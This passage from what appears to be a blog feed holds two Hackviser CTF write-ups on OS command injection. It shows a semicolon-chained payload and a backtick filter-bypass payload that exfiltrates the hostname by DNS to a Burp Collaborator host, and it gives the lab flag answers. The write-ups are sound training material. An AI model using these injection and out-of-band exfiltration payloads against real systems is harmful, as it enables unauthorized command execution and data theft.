<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection5.png" alt="Hackviser - Command Injection Filter Bypass" width="1267" height="626" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection5-lg.png 1024w"></figure>
<p>Now, we need to manipulate a payload to test Blind Command Injection on the website. To do this, we use backquotes <code>`</code> to bypass the blacklisted keyword. Inside the backquote, we use the <code>hostname</code> command to identify the hostname of the machine.</p>
<p>Payload:</p>
<pre class="language-bash line-numbers"><code>`hostname`.ezh05yiz9aqt010ugvzaq9dt7kdb12pr.oastify.com</code></pre>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection6.png" alt="Hackviser - Command Injection Filter Bypass" width="1266" height="898" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection6-lg.png 1024w"></figure>
<p>Our persistence paid off, and the payload executed. However, the output only showed DNS information. Suspecting Blind Command Injection, I went back to the BurpSuite Collaborator tab and clicked the "<strong>Poll now</strong>" button to check for a response from the challenge machine.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection7.png" alt="Hackviser - Command Injection Filter Bypass" width="1376" height="849" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection7-lg.png 1024w"></figure>
<p>In the response, a subdomain appeared, indicating the output of the hostname command. I copied this information before the "<code>.</code>", and that was our machine challenge answer.</p>
<p>Answer:</p>
<pre class="language-bash line-numbers"><code>LEgeNd</code></pre>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/25/hackviser_command_injection8.png" alt="Hackviser - Command Injection Filter Bypass" width="1334" height="410" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/25/responsive/hackviser_command_injection8-lg.png 1024w"></figure>
<p>Hooray! We successfully navigated the Command Injection Filter Bypass challenge on Hackviser.</p>
<h2>Conclusion:</h2>
<p>This lab journey illuminated the nuances of Command Injection vulnerabilities, highlighting the critical importance of input validation and bypass techniques. As we navigated through the challenge on Hackviser, encountering obstacles such as blacklisted keywords and blind injection, we honed our skills in crafting payloads and leveraging tools like BurpSuite Pro. Despite setbacks, persistence paid off as we uncovered the elusive hostname address through collaborative efforts. This experience underscores the necessity for robust security practices in web development and the value of continuous learning in fortifying against cyber threats. With each challenge conquered, we strengthen our defenses and advance our expertise in securing digital landscapes. Congratulations on overcoming the Command Injection Filter Bypass challenge on Hackviser!</p>
</div>
</div>
</div>
</div>
</div>
            ]]>
        </content>
    </entry>
    <entry>
        <title>Hackviser - Basic Command Injection Writeup</title>
        <author>
            <name>Sakibul Ali Khan</name>
        </author>
        <link href="https://sakibulalikhan.pages.dev/hackviser-basic-command-injection-writeup.html"/>
        <id>https://sakibulalikhan.pages.dev/hackviser-basic-command-injection-writeup.html</id>
        <media:content url="https://sakibulalikhan.pages.dev/media/posts/24/Hackviser-Basic-Command-Injection-Writeup-2.png" medium="image" />
            <category term="Web Security"/>
            <category term="Pentesting"/>
            <category term="OWASP 10"/>
            <category term="Hackviser"/>
            <category term="Command Injection"/>
            <category term="CTF Writeups"/>

        <updated>2024-02-22T04:44:10+06:00</updated>
            <summary>
                <![CDATA[
                        <img src="https://sakibulalikhan.pages.dev/media/posts/24/Hackviser-Basic-Command-Injection-Writeup-2.png" alt="Hackviser - Basic Command Injection Writeup" />
                    Basic Command Injection - This lab exposes a Command Injection vulnerability, allowing for remote command execution. The web application takes the desired domain name as&hellip;
                ]]>
            </summary>
        <content type="html">
            <![CDATA[
                    <p><img src="https://sakibulalikhan.pages.dev/media/posts/24/Hackviser-Basic-Command-Injection-Writeup-2.png" class="type:primaryImage" alt="Hackviser - Basic Command Injection Writeup" /></p>
                <div class="MuiBox-root css-lxebfo">
<div class="cl-preview-section">
<p><strong>Basic Command Injection -</strong></p>
</div>
<div class="cl-preview-section">
<p>This lab exposes a Command Injection vulnerability, allowing for remote command execution.</p>
</div>
<div class="cl-preview-section">
<p>The web application takes the desired domain name as a parameter for the “nslookup” utility in the terminal. Your task is to execute a command on the system.</p>
</div>
<div class="cl-preview-section">
<p><strong>What’s the hostname address of the server hosting the website?</strong></p>
</div>
<div class="cl-preview-section">
<h3>What is OS Command Injection?</h3>
</div>
<div class="cl-preview-section">
<p>OS Command Injection represents a vulnerability wherein attackers can run arbitrary commands on the underlying operating system by manipulating user-provided input passed to system shell commands. This vulnerability emerges when web applications directly integrate user input into command strings sans adequate validation or sanitization.</p>
</div>
<div class="cl-preview-section">
<h3>Impact of OS Command Injection</h3>
</div>
<div class="cl-preview-section">
<p>OS Command Injection can result in severe consequences, including unauthorized access, data theft, or complete control over the target system. Attackers exploit this vulnerability to execute commands using the vulnerable application’s privileges, posing significant threats to system security and integrity.</p>
<p>Read more: <a href="https://sakibulalikhan.pages.dev/exploring-os-command-injection-understanding-and-hands-on-practice" title="Exploring OS Command Injection: Understanding and Hands-On Practice">Exploring OS Command Injection: Understanding and Hands-On Practice</a></p>
</div>
</div>
<div class="MuiCollapse-root MuiCollapse-vertical MuiCollapse-entered css-c4sutr">
<div class="MuiCollapse-wrapper MuiCollapse-vertical css-hboir5">
<div class="MuiCollapse-wrapperInner MuiCollapse-vertical css-8atqhb">
<div class="MuiBox-root css-1c8mvc2">
<div class="MuiBox-root css-1v8my8o">
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/24/hackviser_command_injection_lab1.0.png" alt="Hackviser - Basic Command Injection Writeup" width="1387" height="421" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.0-lg.png 1024w"></figure>
<p>In this challenge, we’re given a parameter where we can input a URL for scanning. Behind the scenes, it utilizes <strong><span style="text-decoration: underline;">nslookup</span></strong> to gather information about the entered domain.</p>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/24/hackviser_command_injection_lab1.2.png" alt="Hackviser - Basic Command Injection Writeup" width="1917" height="870" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.2-lg.png 1024w"></figure>
<div class="cl-preview-section">
<p>To execute command injection, I simply used a semicolon to append a Linux command alongside the input URL. In this challenge, we need to discover the hostname of the server. Therefore, my payload was:</p>
</div>
<div class="cl-preview-section">
<pre class="language-bash line-numbers"><code>sak.com; hostname</code></pre>
</div>
<div class="cl-preview-section">
<p>The payload succeeded, yielding the hostname “<strong>squirrel</strong>.”</p>
</div>
<figure class="post__image"><img decoding="async" loading="lazy"  src="https://sakibulalikhan.pages.dev/media/posts/24/hackviser_command_injection_lab1.1.png" alt="Hackviser - Basic Command Injection Writeup" width="1917" height="1006" sizes="(min-width: 920px) 703px, (min-width: 700px) calc(82vw - 35px), calc(100vw - 81px)" srcset="https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-xs.png 300w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-sm.png 480w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-md.png 768w ,https://sakibulalikhan.pages.dev/media/posts/24/responsive/hackviser_command_injection_lab1.1-lg.png 1024w"></figure>
<div class="cl-preview-section">
<h3>Conclusion:</h3>
</div>
<div class="cl-preview-section">
<p>Command Injection vulnerabilities, such as the one demonstrated in this lab, underscore the critical importance of input validation and sanitization in web application development. Failure to properly handle user input can open the door to malicious exploitation, potentially leading to serious security breaches and compromise of sensitive systems. It’s imperative for developers to implement robust security measures, including input validation and segregation of commands, to mitigate the risks associated with Command Injection attacks.</p>
</div>
</div>
</div>
</div>
</div>
</div>
            ]]>
        </content>
    </entry>
</feed>
